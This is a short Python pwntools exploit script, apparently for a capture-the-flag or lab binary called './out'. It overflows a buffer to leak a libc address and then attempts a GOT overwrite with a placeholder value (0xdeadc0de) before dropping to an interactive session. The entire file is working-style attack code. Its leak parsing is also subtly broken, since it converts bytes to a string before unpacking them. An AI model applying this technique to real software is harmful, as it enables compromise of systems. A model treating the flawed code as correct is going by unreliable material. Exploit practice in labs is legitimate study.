#!/usr/bin/python

from pwn import *

def main():
    p = process("./out")

    # Craft first stage (arbitrary read)
    leak_address = 0x403378    # Address of "This is a Jukebox"
    stage_1 = bytes("A"*24, "utf-8") + p32(leak_address)
    p.recvrepeat(0.2)

    # Send the first stage
    p.send(stage_1)

    # Parse the response
    data = p.recvrepeat(0.2)
    leak = data[data.find(b"(")+1:data.rfind(b")")]
    leak = str(leak)
    log.info("Got leaked data: %s" % leak)
    puts_addr = u32(leak[:4])
    log.info("puts@libc: 0x%x" % puts_addr)
    
    # Overwrite puts@got
    ret_address =0xdeadc0de
    p.send(p32(ret_address))

    p.interactive()

if __name__ == "__main__":
    main()
